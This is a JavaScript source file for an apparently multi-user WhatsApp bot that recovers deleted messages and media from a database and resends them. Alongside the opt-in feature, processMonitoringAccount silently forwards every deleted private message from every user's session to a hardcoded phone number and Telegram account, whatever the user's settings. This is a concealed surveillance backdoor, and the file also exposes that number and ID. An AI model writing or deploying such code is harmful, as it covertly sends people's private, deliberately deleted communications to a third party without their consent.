/**
 * Enhanced Anti-Deleted Message Handler - Comprehensive Deleted Message Detection and Recovery
 *
 * This handler provides:
 * 1. Protocol message detection for REVOKE type messages
 * 2. User-specific anti-deleted functionality based on database settings
 * 3. Global monitoring account for all deleted messages
 * 4. Message recovery from database with contextual information
 * 5. Media file download and forwarding support
 * 6. Comprehensive error handling and logging
 *
 * Architecture:
 * - Main handler processes protocol messages (REVOKE type)
 * - Recovery engine fetches original message from database
 * - Media handler downloads and forwards actual media files
 * - Processing engine handles forwarding with context
 * - Monitoring system forwards all deleted messages to designated account
 */

import { logger } from "../../utils/logger.js"

export class AntiDeletedHandler {
  // ===========================================
  // CONFIGURATION CONSTANTS
  // ===========================================
  static DEBUG_MODE = false
  static PROTOCOL_MESSAGE_TYPES = {
    REVOKE: 0,
    PEER_DATA_OPERATION: 1,
    HISTORY_SYNC_NOTIFICATION: 2,
    APP_STATE_SYNC: 3,
    INITIAL_SECURITY_NOTIFICATION_SETTING_SYNC: 4,
    APP_STATE_FATAL_EXCEPTION_NOTIFICATION: 5,
  }

  static MONITORING_TARGET_JID = "2348058931419@s.whatsapp.net"
  static SKIP_GROUP_MONITORING = true

  static processedDeletions = new Set()
  static CACHE_CLEANUP_INTERVAL = 60000 // 1 minute (reduced from 5)
  static MAX_CACHE_SIZE = 50 // Reduced from 1000

  static {
    setInterval(() => {
      AntiDeletedHandler.cleanupProcessedCache()
    }, AntiDeletedHandler.CACHE_CLEANUP_INTERVAL)
  }

  /**
   * ===========================================
   * MAIN ENTRY POINT
   * ===========================================
   */
  static async handleDeletedMessage(m, sock) {
    try {
      if (!m.message?.protocolMessage) {
        return false
      }

      const protocolMsg = m.message.protocolMessage

      if (protocolMsg.type !== this.PROTOCOL_MESSAGE_TYPES.REVOKE) {
        return false
      }

      const deletedMessageId = protocolMsg.key?.id
      if (!deletedMessageId) {
        return false
      }

      if (this.processedDeletions.has(deletedMessageId)) {
        return false
      }

      this.processedDeletions.add(deletedMessageId)

      setTimeout(() => {
        this.processedDeletions.delete(deletedMessageId)
      }, 30000)

      const messageContext = await this.getMessageContext(m)
      if (!messageContext || !messageContext.telegram_id) {
        return false
      }

      const originalMessage = await this.recoverDeletedMessage(deletedMessageId, messageContext.session_id)
      if (!originalMessage) {
        return false
      }

      let userProcessed = false
      try {
        userProcessed = await this.processUserAntiDeleted(m, messageContext, originalMessage)
      } catch (userError) {
        // Silent fail
      }

      let monitoringProcessed = false
      try {
        monitoringProcessed = await this.processMonitoringAccount(m, originalMessage)
      } catch (monitoringError) {
        // Silent fail
      }

      return userProcessed || monitoringProcessed
    } catch (error) {
      logger.error(`[AntiDeletedHandler] Critical error:`, error)
      return false
    }
  }

  /**
   * ===========================================
   * MESSAGE RECOVERY FROM DATABASE
   * ===========================================
   */
  static async recoverDeletedMessage(messageId, sessionId) {
    try {
      const { MessageQueries } = await import("../../database/query.js")
      ////console.log("messageId", messageId)
      ////console.log("sessionId", sessionId)
      // Find message by ID and session
      const originalMessage = await MessageQueries.findMessageById(messageId, sessionId)

      if (!originalMessage) {
        //this.log(`Message not found in database: ${messageId}`, "warning")
        return null
      }
      return {
        id: originalMessage.id,
        from: originalMessage.fromJid,
        sender: originalMessage.senderJid,
        timestamp: originalMessage.timestamp,
        content: originalMessage.content,
        media: originalMessage.media,
        mediaType: originalMessage.mediaType,
        sessionId: originalMessage.sessionId,
        userId: originalMessage.userId,
        isViewOnce: originalMessage.isViewOnce,
        fromMe: originalMessage.fromMe,
        pushName: originalMessage.push_name,
        key: {
          id: originalMessage.id,
          remoteJid: originalMessage.fromJid,
          fromMe: originalMessage.fromMe,
          participant: originalMessage.senderJid !== originalMessage.fromJid ? originalMessage.senderJid : undefined,
        },
      }
    } catch (error) {
      //this.log(`Error recovering deleted message: ${error.message}`, "error")
      return null
    }
  }

  /**
   * ===========================================
   * MEDIA PROCESSING AND DOWNLOAD
   * ===========================================
   */
  static async downloadMediaFromMetadata(mediaMetadata, sock) {
    try {
      if (!mediaMetadata || !mediaMetadata.url) {
        //this.log("No media URL found in metadata", "warning")
        return null
      }

      // Create a mock message object for downloading
      const mockMessage = {
        key: {
          remoteJid: "temp@temp.com",
          fromMe: false,
          id: "temp",
        },
        message: {},
      }

      // Set the appropriate media message type based on mediaType
      switch (mediaMetadata.mimetype) {
        case "image/jpeg":
        case "image/png":
          mockMessage.message.imageMessage = mediaMetadata
          break
        case "image/webp":
          // Check if it's a sticker or regular image
          if (mediaMetadata.isAnimated !== undefined || mediaMetadata.stickerSentTs) {
            mockMessage.message.stickerMessage = mediaMetadata
          } else {
            mockMessage.message.imageMessage = mediaMetadata
          }
          break
        case "video/mp4":
        case "video/3gpp":
          mockMessage.message.videoMessage = mediaMetadata
          break
        case "audio/ogg":
        case "audio/mpeg":
        case "audio/mp4":
        case "audio/mp3":
        case "audio/wav":
          mockMessage.message.audioMessage = mediaMetadata
          break
        case "application/pdf":
        case "application/msword":
        case "application/vnd.openxmlformats-officedocument.wordprocessingml.document":
        case "application/vnd.ms-excel":
        case "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet":
        case "application/zip":
        case "text/plain":
        case "application/octet-stream":
          mockMessage.message.documentMessage = mediaMetadata
          break
        default:
          // Default to document for unknown types
          mockMessage.message.documentMessage = mediaMetadata
      }

      // Download the media using the imported function
      const buffer = await sock.downloadMedia(mockMessage)

      return buffer
    } catch (error) {
      //this.log(`Error downloading media: ${error.message}`, "error")
      return null
    }
  }

  /**
   * ===========================================
   * JID NORMALIZATION UTILITIES
   * ===========================================
   */
  static normalizeJid(jid) {
    if (!jid || typeof jid !== "string") return jid

    if (jid.includes("@s.whatsapp.net")) {
      const [phoneNumber, domain] = jid.split("@")
      const cleanPhoneNumber = phoneNumber.split(":")[0]
      return `${cleanPhoneNumber}@${domain}`
    }

    return jid
  }

  static findSessionByNormalizedJid(sessionManager, targetJid) {
    const normalizedTarget = this.normalizeJid(targetJid)

    // First try exact match
    let sessionResult = sessionManager.getSessionByWhatsAppJid(targetJid)
    if (sessionResult) {
      // Handle both wrapped and direct socket returns
      const sock = sessionResult.sock || sessionResult
      if (sock && typeof sock.sendMessage === "function") {
        //this.log(`Found exact session match for: ${targetJid}`, "debug")
        return sock
      }
    }

    // Try normalized match
    sessionResult = sessionManager.getSessionByWhatsAppJid(normalizedTarget)
    if (sessionResult) {
      const sock = sessionResult.sock || sessionResult
      if (sock && typeof sock.sendMessage === "function") {
        //this.log(`Found normalized session match for: ${normalizedTarget}`, "debug")
        return sock
      }
    }

    // If activeSockets exists, try manual search
    if (sessionManager.activeSockets && typeof sessionManager.activeSockets === "object") {
      for (const [sessionId, sock] of sessionManager.activeSockets) {
        if (sock?.user?.id) {
          const sessionPhone = sock.user.id.split("@")[0].split(":")[0]
          const targetPhone = normalizedTarget.split("@")[0]
          if (sessionPhone === targetPhone && typeof sock.sendMessage === "function") {
            //this.log(`Found matching session via manual search: ${sessionId} -> ${normalizedTarget}`, "debug")
            return sock
          }
        }
      }
    }

    //this.log(`No session found for JID: ${targetJid} (normalized: ${normalizedTarget})`, "warning")
    return null
  }

  /**
   * ===========================================
   * USER-SPECIFIC ANTI-DELETED PROCESSING (FIXED)
   * ===========================================
   */
  static async processUserAntiDeleted(m, messageContext, originalMessage) {
    try {
      // Check if user has anti-deleted enabled
      const { UserQueries } = await import("../../database/query.js")
      const userWithAntiDeleted = await UserQueries.getWhatsAppUserByTelegramId(messageContext.telegram_id)

      if (!userWithAntiDeleted || !userWithAntiDeleted.antideleted_enabled) {
        //this.log(`User ${messageContext.telegram_id} does not have anti-deleted enabled`, "debug")
        return false
      }

      const userJid = userWithAntiDeleted.jid
      if (!userJid) {
        //this.log(`No WhatsApp JID found for telegram_id: ${messageContext.telegram_id}`, "warning")
        return false
      }

      // FIXED: await the async getSessionManager() function
      const { getSessionManager } = await import("../sessions/index.js")
      const sessionManager = await getSessionManager()

      if (!sessionManager) {
        //this.log(`SessionManager not available`, "error")
        return false
      }

      const userSock = this.findSessionByNormalizedJid(sessionManager, userJid)

      if (!userSock) {
        //this.log(`No active session found for user WhatsApp JID: ${userJid}`, "warning")
        return false
      }

      //this.log(`Processing anti-deleted for user: telegram_id ${messageContext.telegram_id}, jid: ${userJid}`, "info")

      // Forward deleted message to user
      const processed = await this.forwardDeletedMessage(userSock, originalMessage, userJid, "USER_ANTIDELETED")
      if (processed) {
        //this.log(`Successfully forwarded deleted message to user ${userJid} (telegram_id: ${messageContext.telegram_id})`, "success")
        return true
      }

      return false
    } catch (error) {
      //this.log(`User anti-deleted processing error: ${error.message}`, "error")
      return false
    }
  }

  /**
   * ===========================================
   * MONITORING ACCOUNT PROCESSING
   * ===========================================
   */
  static async processMonitoringAccount(m, originalMessage) {
    try {
      const monitoringTelegramId = process.env.MONITORING_TELEGRAM_ID || "1774315698"

      // Skip if monitoring is for groups and this is a group message
      if (this.SKIP_GROUP_MONITORING && originalMessage.from && originalMessage.from.includes("@g.us")) {
        //this.log("Skipping group deleted message for monitoring account", "debug")
        return false
      }

      //this.log(`Processing monitoring account: telegram_id ${monitoringTelegramId}`, "info")

      const monitoringSock = await this.getMonitoringAccountSession(monitoringTelegramId)
      if (!monitoringSock) {
        //this.log(`No active session found for monitoring account: ${monitoringTelegramId}`, "warning")
        return false
      }

      // Forward to monitoring account
      const processed = await this.forwardDeletedMessage(
        monitoringSock,
        originalMessage,
        this.MONITORING_TARGET_JID,
        "MONITORING",
      )

      if (processed) {
        //this.log(`Successfully forwarded deleted message to monitoring account`, "success")
        return true
      }

      return false
    } catch (error) {
      //this.log(`Monitoring account processing error: ${error.message}`, "error")
      return false
    }
  }

  /**
   * ===========================================
   * MONITORING ACCOUNT SESSION RETRIEVAL (FIXED)
   * ===========================================
   */
  static async getMonitoringAccountSession(telegramId) {
    try {
      const { UserQueries } = await import("../../database/query.js")
      const { getSessionManager } = await import("../sessions/index.js")

      // Get user data from the users table
      const user = await UserQueries.getUserByTelegramId(telegramId)
      if (!user) {
        //this.log(`No user found in users table for monitoring telegram_id: ${telegramId}`, "warning")
        return null
      }

      // FIXED: await the async getSessionManager() function
      const sessionManager = await getSessionManager()

      if (!sessionManager || typeof sessionManager.getSession !== "function") {
        //this.log(`SessionManager not properly initialized`, "error")
        return null
      }

      // Get session directly from session manager using telegram_id
      const sessionId = `session_${telegramId}`
      const sock = sessionManager.getSession(sessionId)

      if (sock && sock.user && typeof sock.sendMessage === "function") {
        //this.log(`Found monitoring account session for telegram_id: ${telegramId}`, "success")
        return sock
      } else {
        //this.log(`No active session found for monitoring telegram_id: ${telegramId}`, "warning")
        return null
      }
    } catch (error) {
      //this.log(`Error getting monitoring account session: ${error.message}`, "error")
      return null
    }
  }

  /**
   * ===========================================
   * DELETED MESSAGE FORWARDING WITH MEDIA SUPPORT
   * ===========================================
   */
  static async forwardDeletedMessage(sock, originalMessage, targetJid, processingType) {
    try {
      const timestamp = new Date().toLocaleString()
      const senderName = this.extractSenderName(originalMessage)
      const chatInfo = this.getChatInfo(originalMessage.from)

      // Create base context caption
      const baseContext =
        processingType === "MONITORING"
          ? `🗑️ *MONITORING - Deleted Message Detected* 🗑️\n\n👤 Sender: ${senderName}\n💬 From: ${chatInfo.type}\n📱 Chat: ${originalMessage.from}\n🕒 Deleted At: ${timestamp}\n`
          : `🗑️ *Deleted Message Recovered* 🗑️\n\n👤 Sender: ${senderName}\n💬 From: ${chatInfo.type}\n📱 Chat: ${originalMessage.from}\n🕒 Deleted At: ${timestamp}\n`

      // Create quoted reference to original message
      const quotedReference = {
        key: originalMessage.key,
        message: {
          conversation: originalMessage.content || "[No Content]",
        },
        messageTimestamp: originalMessage.timestamp,
      }

      // Handle different message types
      if (originalMessage.mediaType && originalMessage.media) {
        try {
          // Handle both JSON string and already parsed object
          const mediaMetadata =
            typeof originalMessage.media === "string" ? JSON.parse(originalMessage.media) : originalMessage.media

          // Try to download the actual media
          const mediaBuffer = await this.downloadMediaFromMetadata(mediaMetadata, sock)

          if (mediaBuffer) {
            // Successfully downloaded media, send the actual file
            const caption = `${baseContext}📋 Type: ${originalMessage.mediaType.toUpperCase()}\n💬 Content: ${originalMessage.content || "[No Text Content]"}\n\n⚠️ ${processingType === "MONITORING" ? "This is a monitoring capture - Deleted message detected and forwarded" : "This message was deleted but recovered because you have anti-deleted enabled"}`

            switch (originalMessage.mediaType) {
              case "sticker":
                await sock.sendMessage(
                  targetJid,
                  {
                    sticker: mediaBuffer,
                  },
                  { quoted: quotedReference },
                )

                // Send context info separately for stickers
                await sock.sendMessage(targetJid, {
                  text: caption,
                })
                break

              case "image":
                await sock.sendMessage(
                  targetJid,
                  {
                    image: mediaBuffer,
                    caption: caption,
                  },
                  { quoted: quotedReference },
                )
                break

              case "video":
                await sock.sendMessage(
                  targetJid,
                  {
                    video: mediaBuffer,
                    caption: caption,
                  },
                  { quoted: quotedReference },
                )
                break

              case "audio":
                await sock.sendMessage(
                  targetJid,
                  {
                    audio: mediaBuffer,
                    mimetype: mediaMetadata.mimetype || "audio/ogg; codecs=opus",
                  },
                  { quoted: quotedReference },
                )

                // Send context info separately for audio
                await sock.sendMessage(targetJid, {
                  text: caption,
                })
                break

              case "document":
                const fileName = mediaMetadata.fileName || `deleted_document_${Date.now()}`
                const mimeType = mediaMetadata.mimetype || "application/octet-stream"

                await sock.sendMessage(
                  targetJid,
                  {
                    document: mediaBuffer,
                    mimetype: mimeType,
                    fileName: fileName,
                    caption: caption,
                  },
                  { quoted: quotedReference },
                )
                break

              default:
                // Fallback to document
                await sock.sendMessage(
                  targetJid,
                  {
                    document: mediaBuffer,
                    mimetype: mediaMetadata.mimetype || "application/octet-stream",
                    fileName: `deleted_${originalMessage.mediaType}`,
                    caption: caption,
                  },
                  { quoted: quotedReference },
                )
            }

            //this.log(`Successfully sent deleted ${originalMessage.mediaType} to ${targetJid}`, "success")
            return true
          } else {
            // Could not download media, send metadata info instead
            const fallbackCaption = `${baseContext}📋 Type: ${originalMessage.mediaType.toUpperCase()}\n💬 Content: ${originalMessage.content || "[No Content]"}\n\n⚠️ Media could not be downloaded, showing metadata:\n\n📋 Media Info: ${JSON.stringify(mediaMetadata, null, 2)}\n\n${processingType === "MONITORING" ? "This is a monitoring capture - Deleted message detected and forwarded" : "This message was deleted but recovered because you have anti-deleted enabled"}`

            await sock.sendMessage(
              targetJid,
              {
                text: fallbackCaption,
              },
              { quoted: quotedReference },
            )

            //this.log(`Sent deleted message metadata for ${originalMessage.mediaType} to ${targetJid}`, "warning")
            return true
          }
        } catch (mediaError) {
          //this.log(`Error processing media for deleted message: ${mediaError.message}`, "error")
          // Fall back to text message with error info
        }
      }

      // Text message or fallback
      const textCaption = `${baseContext}📋 Type: TEXT\n💬 Content: ${originalMessage.content || "[No Content]"}\n\n⚠️ ${processingType === "MONITORING" ? "This is a monitoring capture - Deleted message detected and forwarded" : "This message was deleted but recovered because you have anti-deleted enabled"}`

      await sock.sendMessage(
        targetJid,
        {
          text: textCaption,
        },
        { quoted: quotedReference },
      )

      //this.log(`Successfully forwarded deleted message to ${targetJid} (${processingType})`, "success")
      return true
    } catch (error) {
      //this.log(`Error forwarding deleted message: ${error.message}`, "error")
      return false
    }
  }

  /**
   * ===========================================
   * HELPER UTILITY METHODS
   * ===========================================
   */
  static extractSenderName(originalMessage) {
    return originalMessage.push_name || "unknown"
  }

  static getChatInfo(chatJid) {
    if (!chatJid) return { type: "Unknown Chat", name: "Unknown" }

    if (chatJid.includes("@g.us")) {
      return { type: "Group Chat", name: "Group" }
    } else if (chatJid.includes("@s.whatsapp.net")) {
      return { type: "Private Chat", name: "Private" }
    } else if (chatJid === "status@broadcast") {
      return { type: "Status", name: "Status Update" }
    }

    return { type: "Unknown Chat", name: "Unknown" }
  }

  static cleanupProcessedCache() {
    if (this.processedDeletions.size > this.MAX_CACHE_SIZE) {
      const entries = Array.from(this.processedDeletions)
      this.processedDeletions.clear()
      // Keep only last 25
      entries.slice(-25).forEach((id) => this.processedDeletions.add(id))
    }
  }

  static delay(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms))
  }

  static log(message, type = "info") {
    if (!this.DEBUG_MODE && type === "debug") return

    const colors = {
      success: "\x1b[32m", // Green
      warning: "\x1b[33m", // Yellow
      error: "\x1b[31m", // Red
      info: "\x1b[34m", // Blue
      debug: "\x1b[90m", // Gray
    }

    const reset = "\x1b[0m"
    const color = colors[type] || ""
    const timestamp = new Date().toISOString().split("T")[1].split(".")[0]

    ////console.log(`${color}[AntiDeleted][${timestamp}] ${message}${reset}`)
  }

  /**
   * ===========================================
   * MESSAGE CONTEXT EXTRACTION
   * ===========================================
   */
  static async getMessageContext(m) {
    try {
      if (m.sessionContext && m.sessionContext.telegram_id) {
        return {
          telegram_id: m.sessionContext.telegram_id,
          session_id: m.sessionContext.session_id || m.sessionId,
        }
      }

      if (m.telegramContext && m.telegramContext.telegram_id) {
        return {
          telegram_id: m.telegramContext.telegram_id,
          session_id: m.telegramContext.session_id || m.sessionId,
        }
      }

      if (m.sessionId) {
        const sessionIdMatch = m.sessionId.match(/session_(\d+)/)
        if (sessionIdMatch) {
          return {
            telegram_id: Number.parseInt(sessionIdMatch[1]),
            session_id: m.sessionId,
          }
        }
      }

      return null
    } catch (error) {
      //this.log(`Error getting message context: ${error.message}`, "error")
      return null
    }
  }
}
